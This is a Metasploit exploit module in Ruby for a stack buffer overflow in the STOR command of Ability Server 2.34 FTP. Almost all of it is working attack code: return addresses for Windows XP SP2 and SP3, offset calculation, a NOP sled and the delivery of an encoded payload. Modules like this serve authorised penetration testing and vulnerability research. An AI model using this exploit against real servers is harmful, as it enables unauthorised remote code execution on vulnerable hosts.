##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Ftp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Ability Server 2.34 STOR Command Stack Buffer Overflow',
      'Description'    => %q{
        This module exploits a stack-based buffer overflow in Ability Server 2.34.
        Ability Server fails to check input size when parsing 'STOR' and 'APPE' commands,
        which leads to a stack based buffer overflow. This plugin uses the 'STOR' command.

        The vulnerability has been confirmed on version 2.34 and has also been reported
        in version 2.25 and 2.32. Other versions may also be affected.
      },
      'Author'         =>
        [
          'muts',        #Initial discovery
          'Dark Eagle',  #same as muts
          'Ekelow'       #Metasploit
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', '2004-1626' ],
          [ 'URL', 'http://www.exploit-db.com/exploits/588/'],
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process'
        },
      'Privileged'     => false,
      'Payload'        =>
        {
          'Space'    => 1000,
          'BadChars' => "\x00\xff"
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [
            'Windows XP SP2 ENG',
            {
              #JMP ESP  (MFC42.dll. Addr remains unchanged until a patched SP3)
              'Ret' => 0x73E32ECF,
              'Offset' => 966
            }
          ],
          [
            'Windows XP SP3 ENG',
            {
              #JMP ESP  (USER32.dll. Unchanged unpatched SP3 - fully pathced)
              'Ret' => 0x7E429353,
              'Offset' => 966
            }
          ],
        ],
      'DisclosureDate' => 'Oct 22 2004',
      'DefaultTarget' => 1))

    register_options(
      [
        Opt::RPORT(21),
        OptString.new('FTPUSER', [ true, 'Valid FTP username', 'ftp' ]),
        OptString.new('FTPPASS', [ true, 'Valid FTP password for username', 'ftp' ])
      ], self.class)
    end

  def check
    connect
    disconnect
    if banner =~ /Ability Server 2\.34/
      return Exploit::CheckCode::Vulnerable
    else
      if banner =~ /Ability Server/
        return Exploit::CheckCode::Detected
      end
    end
    return Exploit::CheckCode::Safe
  end

  def exploit
    connect_login

    myHost = datastore['LHOST'] == '0.0.0.0' ? Rex::Socket.source_address : datastore['LHOST']

    # Take client ip + ftp user lengths into account for EIP offset
    padd_size = target['Offset'] + (13 - myHost.length) + (3 - datastore['FTPUSER'].length)
    junk = rand_text_alpha(padd_size)

    sploit = junk
    sploit << [target.ret].pack('V')
    sploit << make_nops(32)
    sploit << payload.encoded
    sploit << rand_text_alpha(sploit.length)

    send_cmd(['STOR', sploit], false)
    handler
    disconnect
  end
end
